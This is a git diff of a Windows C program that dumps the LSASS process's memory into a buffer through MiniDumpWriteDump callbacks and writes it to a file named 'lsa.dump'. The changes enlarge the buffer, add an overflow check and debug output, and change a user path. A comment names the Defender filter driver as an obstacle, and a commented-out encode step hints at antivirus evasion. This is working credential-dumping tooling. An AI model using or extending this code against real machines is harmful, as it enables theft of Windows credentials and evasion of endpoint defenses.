@@ -9,6 +9,10 @@
 #pragma comment (lib, "ntdll.lib")
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "Version.lib")
+
+#define MAXBUFF (1024 * 1024 * 100)
+
+
 // Observation perso : WdFilter pose pb
 
 // https://www.youtube.com/watch?v=mI3FgE1K4PE&list=PLEQL8X1EIhuMGl9dT0u-9MKDMOHFtCdmg&index=20&t=169s&ab_channel=HichamElAaouad
@@ -115,14 +119,21 @@ BOOL CALLBACK minidumpCallback(
 		break;
 	case IoWriteAllCallback:
 		printf("DATA %d\n", ++pathnbr);
-		callbackOutput->Status = S_OK;
+		
 		source = callbackInput->Io.Buffer;
 		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
 
 		// Size of the chunk of minidump that's just been read.
 		bufferSize = callbackInput->Io.BufferBytes;
 		bytesRead += bufferSize;
+		if (bytesRead >= MAXBUFF) {
+			printf("Outch overflow\n");
+			exit(1);
+		}
+		printf("Starting copying %d bytes. The size will be %d bytes", bufferSize, bytesRead);
 		RtlCopyMemory(destination, source, bufferSize);
+		printf("OK\n");
+		callbackOutput->Status = S_OK;
 		//encode(destination, bufferSize);
 		break;
 	case IoFinishCallback:
@@ -191,7 +202,7 @@ BOOL CALLBACK minidumpCallback(
 	return TRUE;
 }
 int main(int argc, char *argv[]) {
-	dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
+	dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXBUFF);
 	bytesRead = 0;
 
 
@@ -215,7 +226,7 @@ int main(int argc, char *argv[]) {
 		return 0;
 	}
 
-	LPCSTR fileName_pointer = L"C:\\Users\\seb\\Desktop\\whitelist\\x64\\lsa.dump";
+	LPCSTR fileName_pointer = L"C:\\Users\\sebastien.carre\\whitelist\\lsa.dump";
 	HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
 
